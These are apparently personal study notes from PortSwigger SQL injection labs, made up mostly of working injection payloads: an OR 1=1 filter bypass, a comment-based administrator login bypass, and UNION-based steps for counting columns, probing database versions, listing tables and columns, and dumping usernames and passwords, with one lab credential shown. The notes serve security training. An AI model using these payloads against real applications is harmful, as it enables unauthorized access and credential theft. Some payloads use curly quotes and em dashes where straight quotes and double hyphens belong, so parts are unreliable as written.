# SQL injection

CheatSheet: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## **Retrieving hidden data - Vulnerability in WHERE clause allowing retrieval of hidden data**

In GET Query parameter just add ‘OR 1=1—

```
/filter?category=Accessories' OR 1=1--
```

## ****Subverting application logic - SQL injection vulnerability allowing login bypass****

Request body:

```
csrf=SguQ2lewWGmFunaO60b4dDvxLLm0Ndq7&username=administrator'--&password=peter
```

query would look like:

```
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## UNION Attacks

*NOTE*:

- Some of the end char can not work so if “ - - “ doesn’t work you should try #

1. Determine number of columns
    
    ```
    ‘order by x—
    ```
    
    x - column number
    
    do until you hit internal server error
    
2. Determine the data types of the columns
    
    ```
    ‘union select ‘a’, NULL—
    ```
    
    if you see that types are string but you still get internal server error, that means that you are breaking into Oracle database
    
    for Oracle you should use like this: ‘union select ‘a’, ‘a’ from DUAL—
    
3. Checking database version
    
    ```
    ‘ UNION SELECT VERSION()— (mysql)
    ```
    
    ```
    ‘ UNION SELECT version FROM v$instance  || ‘ UNION SELECT banner FROM v$version
    ```
    
    NOTE: keep in mind if there is more than one column, then you have to pass nullable to other columns, example (two columns):
    
    ```
    ‘ UNION SELECT banner, NULL FROM v$version
    ```
    
4. Output table name (every single db outputs differently) in this case i’ll provide postgres (other things you can find in cheatsheet)
    1. Finding version
        
        ```
        ' UNION SELECT version(), NULL--
        ```
        
    2. Output the list of table names in the database
        
        ```
        ' UNION SELECT table_name, NULL FROM information_schema.tables-- (in my case was users_kxcfuq)
        ```
        
    3. Output the column names of the table
        
        ```
        ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_kxcfuq'-- (username_qbheac, password_gjnzjk)
        ```
        
    4. Output the usernames and passwords
        
        ```
        ' UNION select username_qbheac, password_gjnzjk from users_kxcfuq-- (administrator, 372c1ao9kijiug5t02h0)
        ```
        

*NOTE*:

AND 0 ignores first table result, throws false to first query/statement

```
‘ AND 0 Union SELECT 1, 2, 3, 4, password, date() FROM users WHERE email = "admin@viking.bank"--
```

```
‘ UNION SELECT NULL, NULL, NULL, NULL, NULL—
```